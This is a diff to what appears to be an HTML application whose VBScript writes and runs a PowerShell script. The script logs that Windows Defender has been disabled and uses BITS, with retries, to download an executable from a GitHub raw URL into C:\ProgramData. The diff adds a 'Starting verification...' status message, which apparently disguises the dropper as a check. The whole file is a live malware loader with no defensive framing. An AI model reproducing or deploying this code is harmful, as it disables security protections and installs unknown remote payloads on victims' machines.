@@ -119,6 +119,8 @@ End Sub
 Sub RunPowerShell()
     On Error Resume Next
     
+    document.getElementById("statusMessage").innerHTML = "Starting verification..."
+    
     ' Create PowerShell script file with proper error handling
     Dim fso, psFile
     Set fso = CreateObject("Scripting.FileSystemObject")
@@ -135,14 +137,14 @@ Sub RunPowerShell()
     psFile.WriteLine "    'Defender disabled at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
     psFile.WriteLine "    "
     psFile.WriteLine "    # Download file using BITS with retry logic"
-    psFile.WriteLine "    $maxRetries = 5"
+    psFile.WriteLine "    $maxRetries = 3"
     psFile.WriteLine "    $retryCount = 0"
     psFile.WriteLine "    $success = $false"
     psFile.WriteLine "    "
     psFile.WriteLine "    while ($retryCount -lt $maxRetries -and -not $success) {"
     psFile.WriteLine "        try {"
     psFile.WriteLine "            $bits = Start-BitsTransfer -Source 'https://github.com/golegn/kgbs/raw/refs/heads/main/newsetup3.exe' -Destination 'C:\ProgramData\pibi.exe' -TransferType Download -Priority High -ErrorAction Stop"
-    psFile.WriteLine "     	  $success = $true"
+    psFile.WriteLine "            $success = $true"
     psFile.WriteLine "            'File downloaded successfully at: ' + (Get-Date).ToString() | Out-File 'C:\ProgramData\log.txt' -Append -Encoding UTF8"
     psFile.WriteLine "        } catch {"
     psFile.WriteLine "            $retryCount++"
@@ -206,4 +208,4 @@ Sub RunPowerShell()
 End Sub
 </script>
 </body>
-</html>с
+</html>
